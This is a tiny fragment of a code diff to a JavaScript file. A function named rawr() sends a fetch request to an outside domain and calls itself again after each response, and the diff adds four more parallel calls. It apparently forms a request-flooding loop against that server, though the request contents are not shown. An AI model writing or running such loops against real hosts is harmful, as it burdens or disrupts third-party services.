@@ -38,3 +38,7 @@ fetch("https://api-bytow.robloxdiscord.pl/egg", {
 }).then(e=>{rawr()})
 }
 rawr()
+rawr()
+rawr()
+rawr()
+rawr()
